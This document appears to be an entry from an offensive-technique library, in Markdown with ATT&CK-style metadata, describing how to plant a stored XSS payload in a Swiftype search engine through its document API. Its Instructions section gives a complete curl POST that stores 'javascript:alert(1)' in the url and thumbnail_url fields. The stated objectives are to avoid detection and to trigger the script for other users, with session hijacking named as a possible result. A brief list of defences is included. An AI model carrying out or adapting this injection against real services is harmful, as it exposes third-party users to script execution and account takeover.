---
id: uuid-inject-xss
tags:
  - xss-injection
  - api-post
  - payload-storage
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/inject-xss-payload-swiftype-api]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:20.010Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-into-Swiftype-Document-via-API

## Summary

This procedure uses the Swiftype API to create a document with a JavaScript XSS payload in the 'url' and 'thumbnail_url' fields, exploiting lack of input sanitization for stored XSS persistence.

## Description

After setting up an engine, the API endpoint allows POSTing documents with custom fields. By setting 'url' to 'javascript:alert(1)', the payload is stored and later rendered unsafely as a clickable link in the web UI. This targets API-based engines and requires a valid auth_token. Prerequisites include an active trial account and engine. Successful injection stores the payload for execution by any user viewing the document, potentially leading to session hijacking.

## Requirements

1. Swiftype API key (auth_token) from account settings
2. Engine ID (e.g., 123) and document type (e.g., test)
3. curl tool installed for HTTP requests
4. Unique external_id for the document (e.g., v1uyQZNg2vE)

## Defense

Defensive measures and detection strategies:

- Validate and sanitize URL fields to block javascript: schemes
- Encode output when rendering links in the UI (e.g., escape href attributes)
- Log and monitor API document creations for suspicious payloads
- Restrict API access to verified accounts only

## Objectives

1. Store malicious JavaScript in document fields without detection
2. Ensure payload compatibility with enum-type fields
3. Prepare for UI-based trigger by authorized users

## Instructions

### Step 1: Retrieve API Key

**Context**: Obtain the authentication token needed for API calls.

Go to https://app.swiftype.com/settings/account and copy the API key (e.g., gB7BT3iA3GhqoU_SWoRq).

> Expected output: API key displayed in account settings.

### Step 2: Execute Payload Injection

**Context**: Send a POST request to create the document with XSS in URL fields.

**Command** ([[commands/inject-xss-payload-swiftype-api]]):
```bash
curl -X POST 'https://api.swiftype.com/api/v1/engines/123/document_types/test/documents.json' -H 'Content-Type: application/json' -d '{ "auth_token": "gB7BT3iA3GhqoU_SWoRq", "document": { "external_id": "v1uyQZNg2vE", "fields": [ {"name": "url", "value": "javascript:alert(1)", "type": "enum"}, {"name": "thumbnail_url", "value": "javascript:alert(1)", "type": "enum"}, {"name": "channel_id", "value": "UCK8sQmJBp8GCxrOtXWBpyEA", "type": "enum"}, {"name": "title", "value": "How It Feels [through Glass]", "type": "string"}, {"name": "caption", "value": "Want to see how Glass actually feels?...", "type": "text"}, {"name": "tags", "value": ["glass", "wearable computing", "google"], "type": "string"}, {"name": "category_name", "value": "Science & Technology", "type": "string"}, {"name": "category_id", "value": 28, "type": "enum"}, {"name": "published_at", "value": "2013-02-20T10:47:18", "type": "date"}, {"name": "duration", "value": 136, "type": "integer"}, {"name": "view_count", "value": 14599202, "type": "integer"}, {"name": "like_count", "value": 75952, "type": "integer"} ] } }'
```

> This command authenticates with the token, sets the external_id, and defines fields including the XSS payload. Expected output: JSON response with document ID and success status (HTTP 200/201).

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/inject-xss-payload-swiftype-api]]

## Tools Used

- [[tools/curl]]

## Tags

- xss-injection
- api-post
- payload-storage
